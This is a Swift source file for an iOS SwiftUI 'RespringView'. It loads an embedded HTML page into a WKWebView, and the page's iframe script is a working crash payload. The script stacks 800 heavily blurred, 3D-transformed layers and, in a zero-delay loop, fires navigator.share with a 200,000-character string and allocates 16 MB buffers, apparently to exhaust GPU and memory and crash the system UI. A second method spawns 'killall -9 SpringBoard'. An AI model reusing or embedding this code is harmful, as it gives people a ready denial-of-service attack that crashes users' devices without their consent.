import SwiftUI
import UIKit
import WebKit
import Darwin

private let respringDocument = """
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
<body style="background:#000;margin:0">
<iframe id="frame" srcdoc="" sandbox="allow-scripts" style="width:100vw;height:100vh;border:0"></iframe>
<script>
const inner = `
<html><body style="margin:0;background:#000">
<script>
const container = document.createElement('div');
container.style.cssText = 'perspective:1px;perspective-origin:999999% 999999%;';
document.body.appendChild(container);
for (let i = 0; i < 800; i++) {
  const d = document.createElement('div');
  d.style.cssText = 'position:absolute;width:200vw;height:200vh;' +
    'backdrop-filter:blur(240px);-webkit-backdrop-filter:blur(240px);' +
    'transform:translate3d(' + (i*100) + 'px,' + (i*100) + 'px,' + (i*2) + 'px) rotateY(89deg);' +
    'background:radial-gradient(circle,rgba(255,0,0,.4),rgba(0,0,255,.4));';
  container.appendChild(d);
}
setInterval(function() {
  try { navigator.share({title:'r', text:'r'.repeat(200000)}); } catch (e) {}
  try {
    var x = new Uint8Array(1024 * 1024 * 16);
    crypto.getRandomValues(x);
    if (window._buffers === undefined) window._buffers = [];
    window._buffers.push(x);
    if (window._buffers.length > 60) window._buffers = [];
  } catch (e) {}
}, 0);
<\\/script></body></html>`;
document.getElementById('frame').srcdoc = inner;
</script>
</body>
</html>
"""

struct RespringView: UIViewRepresentable {
    func makeUIView(context: Context) -> WKWebView {
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences.allowsContentJavaScript = true
        config.preferences.javaScriptCanOpenWindowsAutomatically = true
        let view = WKWebView(frame: .zero, configuration: config)
        view.isOpaque = false
        view.backgroundColor = .black
        return view
    }

    func updateUIView(_ webView: WKWebView, context: Context) {
        guard !context.coordinator.loaded else { return }
        context.coordinator.loaded = true
        webView.loadHTMLString(respringDocument, baseURL: nil)
    }

    func makeCoordinator() -> Coordinator { Coordinator() }
    class Coordinator { var loaded = false }

    static func attemptSystemRespring() {
        DispatchQueue.global(qos: .userInitiated).async {
            let path = "/usr/bin/killall"
            var pid: pid_t = 0
            var args: [UnsafeMutablePointer<CChar>?] = [
                strdup("killall"),
                strdup("-9"),
                strdup("SpringBoard"),
                nil
            ]
            let ret = posix_spawn(&pid, path, nil, nil, &args, nil)
            for arg in args where arg != nil { free(arg) }
            _ = ret
        }
    }
}
